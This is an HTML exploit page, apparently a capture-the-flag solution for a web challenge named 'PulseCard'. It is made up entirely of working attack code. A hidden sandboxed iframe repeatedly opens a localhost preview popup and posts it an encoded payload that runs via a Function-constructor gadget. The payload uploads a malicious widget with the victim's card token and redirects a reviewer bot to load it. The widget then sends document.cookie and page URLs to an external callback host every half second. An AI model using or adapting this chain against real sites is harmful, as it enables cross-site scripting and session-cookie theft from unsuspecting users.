<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>PulseCard final</title>
</head>
<body>
  <h1>PulseCard final</h1>

  <iframe
    id="sender"
    sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"
    style="display:none">
  </iframe>

  <script>
  const CALLBACK = "https://zhgqyap.request.dreamhack.games";

  new Image().src = CALLBACK + "/loaded?t=" + Date.now();

  const widgetJS =
    `(()=>{` +
    `let C=${JSON.stringify(CALLBACK)};` +
    `let S=()=>{` +
    `let c=document.cookie||"EMPTY";` +
    `new Image().src=C+"/cookie?c="+encodeURIComponent(c)+"&u="+encodeURIComponent(location.href)+"&t="+Date.now();` +
    `fetch(C+"/fetch?c="+encodeURIComponent(c)+"&t="+Date.now(),{mode:"no-cors",keepalive:true}).catch(()=>{});` +
    `};` +
    `S();setInterval(S,500);` +
    `})()`;

  const stage2 =
    `(async()=>{try{` +
    `let r=await fetch('/export',{method:'POST',credentials:'include',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:${JSON.stringify(widgetJS)}});` +
    `let x=await r.text();` +
    `opener.postMessage({t:'stage',s:r.status,x:x},'*');` +
    `}catch(e){opener.postMessage({t:'err',x:String(e)},'*')}})()`;

  const pctAll = s =>
    Array.from(new TextEncoder().encode(s), b =>
      "%" + b.toString(16).padStart(2, "0")
    ).join("");

  const formula =
    `Date["con"+"structor"](decodeURIComponent(${JSON.stringify(pctAll(stage2))}))()`;

  window.addEventListener("message", e => {
    const d = e.data || {};

    new Image().src =
      CALLBACK +
      "/msg?d=" +
      encodeURIComponent(JSON.stringify(d).slice(0, 1500)) +
      "&t=" +
      Date.now();

    if (d.t === "stage" && d.s === 200 && /^[A-Za-z0-9_-]+\.js$/.test(d.x)) {
      const target =
        "http://localhost:5000/review?widget=" + encodeURIComponent(d.x);

      new Image().src =
        CALLBACK +
        "/nav?to=" +
        encodeURIComponent(target) +
        "&t=" +
        Date.now();

      setTimeout(() => {
        location.href = target;
      }, 300);
    }
  });

  const inner = `
<!doctype html>
<html>
<body>
<script>
  const CALLBACK = ${JSON.stringify(CALLBACK)};
  const payload = ${JSON.stringify(formula)};

  new Image().src = CALLBACK + "/sender-start?t=" + Date.now();

  window.addEventListener("message", e => {
    top.postMessage(e.data, "*");
  });

  let w = null;

  function go() {
    try {
      if (!w || w.closed) {
        w = window.open("http://localhost:5000/preview", "pulsecard_preview");
        new Image().src = CALLBACK + "/popup-opened?ok=" + String(!!w) + "&t=" + Date.now();
      }

      if (w) {
        w.postMessage(payload, "*");
        new Image().src = CALLBACK + "/posted?t=" + Date.now();
      }
    } catch (e) {
      new Image().src = CALLBACK + "/sender-error?e=" + encodeURIComponent(String(e)) + "&t=" + Date.now();
    }
  }

  setInterval(go, 500);
<\/script>
</body>
</html>
  `;

  document.getElementById("sender").srcdoc = inner;
  </script>
</body>
</html>
